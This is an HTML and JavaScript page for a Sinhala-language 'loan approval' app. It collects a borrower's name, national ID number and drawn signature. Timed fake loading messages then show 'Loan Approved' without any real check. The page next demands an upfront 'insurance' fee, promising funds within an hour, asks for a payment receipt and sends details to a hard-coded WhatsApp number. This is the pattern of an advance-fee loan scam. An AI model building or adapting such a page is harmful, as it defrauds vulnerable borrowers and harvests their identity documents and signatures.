<!DOCTYPE html>
<html lang="si">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<title>EzC Signature App</title>
<style>
*{box-sizing:border-box;}
body{margin:0;font-family:system-ui;background:#eaeef3;}
.app{max-width:420px;margin:auto;min-height:100vh;background:#fff;}
.page{padding:16px;}
h3{text-align:center;}
label{display:block;margin-top:14px;font-weight:600;}
input, textarea, select{
 width:100%;
 padding:14px;
 margin-top:6px;
 border-radius:12px;
 border:1px solid #ccc;
 font-size:16px;
 -webkit-text-size-adjust:100%;
 line-height:1.4;
}
button{width:100%;padding:14px;margin-top:14px;border:none;border-radius:14px;font-size:16px;color:#fff;}
.next-btn{background:#27ae60;}
.clear-btn{background:#e74c3c;}
.pay-btn{background:#2980b9;}
.whatsapp-btn{background:#25D366;}
.info-btn{background:#8e44ad;}
canvas{width:100%;height:160px;border:2px dashed #aaa;border-radius:12px;margin-top:8px;touch-action:none;}
.statement{margin-top:12px;padding:12px;background:#f4f6f8;border-radius:12px;font-size:14px;}
#page2{display:none;}
#loading{position:fixed;inset:0;background:rgba(255,255,255,.96);display:none;flex-direction:column;align-items:center;justify-content:center;z-index:999;text-align:center;}
.spinner{width:48px;height:48px;border:5px solid #ddd;border-top:5px solid #27ae60;border-radius:50%;animation:spin 1s linear infinite;margin-bottom:16px;}
@keyframes spin{100%{transform:rotate(360deg);}}
</style>
</head>
<body>
<div class="app">

<!-- PAGE 1 -->
<div class="page" id="page1">
<h3>Customer Details</h3>
<label>Name</label>
<input id="name">
<label>NIC</label>
<input id="nic">
<label>Amount (Rs)</label>
<input type="number" id="amount">
<div class="statement">
මා විසින් ලබාගන්නා මෙම මුදල, නියමිත කොන්දේසි වලට එකඟව ගෙවීමට පොරොන්දු වෙමි.
</div>
<label>Signature</label>
<canvas id="sign"></canvas>
<button class="clear-btn" onclick="clearSign()">Clear Signature</button>
<button class="next-btn" onclick="goNext()">Next</button>
</div>

<!-- PAGE 2 -->
<div class="page" id="page2">
<h3>Loan Approved</h3>
<p><b>Customer ID:</b> <span id="customerId"></span></p>
<p><b>Amount:</b> Rs. <span id="showAmount"></span></p>
<p><b>Insurance:</b> Rs. <span id="insurance"></span></p>
<div class="statement">
රක්ෂණ මුදල ගෙවීමෙන් පසු පැයක් ඇතුළත මුදල් බැර කෙරේ.
</div>
<label>Upload Receipt</label>
<input type="file" id="receipt" accept="image/*,.pdf">
<button class="next-btn" onclick="submitForm()">Upload Signature + Receipt</button>
<button class="info-btn" onclick="openInsuranceInfo()">Insurance Payment හේතුව</button>
<button class="pay-btn" onclick="payNow()">Pay Now</button>
<button class="whatsapp-btn" onclick="sendWhatsApp()">WhatsApp මගින් විස්තර යවන්න</button>
</div>

</div>

<!-- LOADING -->
<div id="loading">
 <div class="spinner"></div>
 <div id="loadingText">Loading...</div>
</div>

<script>
const PAY_LINK="https://example.com/pay";
const INSURANCE_INFO_LINK="https://example.com/insurance-info";
const WHATSAPP_NO="94742089009";
let EZ_ID="";

/* INSURANCE */
function calculateInsurance(a){a=parseInt(a);if(a<=50000) return 3000;if(a<=100000) return 3500;return 4000;}

/* SIGNATURE PAD - full display, touch friendly */
const c=document.getElementById("sign");
const ctx=c.getContext("2d");
function resizeCanvas(){
 const container=c.parentElement;
 const ratio=window.devicePixelRatio||1;
 c.width=container.clientWidth*ratio;
 c.height=160*ratio; // fixed height
 c.style.width=container.clientWidth+"px";
 c.style.height="160px";
 ctx.setTransform(ratio,0,0,ratio,0,0);
 ctx.lineWidth=3;
 ctx.lineCap="round";
}
resizeCanvas();
window.addEventListener("resize",resizeCanvas);

let drawing=false,lastX=0,lastY=0;
c.onpointerdown=e=>{drawing=true;lastX=e.offsetX;lastY=e.offsetY;ctx.beginPath();ctx.moveTo(lastX,lastY);}
c.onpointermove=e=>{if(!drawing) return; ctx.lineTo(e.offsetX,e.offsetY); ctx.stroke(); lastX=e.offsetX; lastY=e.offsetY;}
c.onpointerup=c.onpointerleave=()=>drawing=false;
function clearSign(){ctx.clearRect(0,0,c.width,c.height);resizeCanvas();}

/* PAGE 1 AUTO SCROLL */
const nameEl=document.getElementById("name");
const nicEl=document.getElementById("nic");
const amountEl=document.getElementById("amount");
function scrollToEl(el){setTimeout(()=>el.scrollIntoView({behavior:"smooth",block:"center"}),150);}
nameEl.addEventListener("change",()=>{if(nameEl.value.length>2) scrollToEl(nicEl);});
nicEl.addEventListener("change",()=>{if(nicEl.value.length>5) scrollToEl(amountEl);});
amountEl.addEventListener("change",()=>{if(amountEl.value>0) scrollToEl(c);});

/* NEXT PAGE */
function goNext(){
 if(!nameEl.value||!nicEl.value||!amountEl.value){alert("කරුණාකර සියලු fields පුරවන්න");return;}
 loading.style.display="flex"; loadingText.innerText="විස්තර upload කරමින් පවතී...";
 setTimeout(()=>loadingText.innerText="ණය මුදල් ලබා ගැනීමට ඉදිරි පියවර complete කරමින්...",5000);
 setTimeout(()=>{
  loading.style.display="none";
  page1.style.display="none";
  page2.style.display="block";
  EZ_ID="EZ-"+Date.now();
  customerId.innerText=EZ_ID;
  showAmount.innerText=amountEl.value;
  insurance.innerText=calculateInsurance(amountEl.value);
  setTimeout(()=>page2.scrollIntoView({behavior:"smooth"}),200);
 },8000);
}

/* PAY */
function payNow(){loading.style.display="flex"; loadingText.innerText="Payment gateway load වෙමින් පවතී..."; setTimeout(()=>{loading.style.display="none";window.open(PAY_LINK,"_blank");},2000);}

/* WHATSAPP */
function sendWhatsApp(){
 const msg=`📄 Loan Details
Customer ID: ${EZ_ID}
Amount: Rs.${showAmount.innerText}
Insurance: Rs.${insurance.innerText}
Time: ${new Date().toLocaleString()}`;
 window.open(`https://wa.me/${WHATSAPP_NO}?text=${encodeURIComponent(msg)}`);
}

/* INSURANCE INFO */
function openInsuranceInfo(){window.open(INSURANCE_INFO_LINK,"_blank");}

/* UPLOAD SIGNATURE + RECEIPT */
async function submitForm(){
 const receiptInput=document.getElementById("receipt");
 if(receiptInput.files.length===0){alert("කරුණාකර receipt එක upload කරන්න");return;}
 loading.style.display="flex"; loadingText.innerText="Uploading signature & receipt...";
 const signatureBlob=await new Promise(res=>c.toBlob(res,"image/png"));
 const formData=new FormData();
 formData.append("customerId",EZ_ID);
 formData.append("amount",showAmount.innerText);
 formData.append("insurance",insurance.innerText);
 formData.append("signature",signatureBlob,"signature.png");
 formData.append("receipt",receiptInput.files[0]);
 try{
   const response=await fetch("https://example.com/upload",{method:"POST",body:formData});
   const result=await response.json();
   loading.style.display="none";
   if(result.success){alert("Signature & Receipt uploaded successfully!");}
   else{alert("Upload failed: "+result.message);}
 }catch(err){loading.style.display="none";alert("Server error: "+err.message);}
}
</script>
</body>
</html>
